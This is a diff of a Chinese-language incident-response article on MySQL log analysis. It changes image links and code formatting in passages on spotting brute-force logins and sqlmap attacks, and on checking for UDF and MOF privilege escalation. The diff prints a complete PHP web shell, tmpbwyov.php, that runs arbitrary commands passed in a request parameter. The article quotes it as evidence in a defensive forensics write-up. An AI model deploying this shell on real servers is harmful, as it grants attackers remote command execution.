@@ -35,7 +35,7 @@ SET GLOBAL general_log = 'On';
 
 我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。
 
-![](./image/log-5-1.png)
+![](http://img-upaiyun-own.test.upcdn.net/log-5-1.png)
 
 MySQL中的log记录是这样子：
 
@@ -132,13 +132,17 @@ grep  "Access denied" mysql.log |cut -d "'" -f2|uniq -c|sort -nr
 
 HTTP通讯过程如下：
 
-![](./image/log-5-3.png)
+![](http://img-upaiyun-own.test.upcdn.net/log-5-3.png)
 
 创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。
 
-tmpbwyov.php：
+`tmpbwyov.php`：
 
+```php
 <?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?>`
+```
+
+
 
 创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。
 
@@ -148,15 +152,18 @@ tmpbwyov.php：
 
 1、检查网站目录下，是否存在一些木马文件：
 
-![](./image/log-5-4.png)
+![](http://img-upaiyun-own.test.upcdn.net/log-5-4.png)
 
 2、检查是否有UDF提权、MOF提权痕迹
 
 检查目录是否有异常文件
 
+```bash
 mysql\lib\plugin 
-
 c:/windows/system32/wbem/mof/
+```
+
+
 
 检查函数是否删除
 
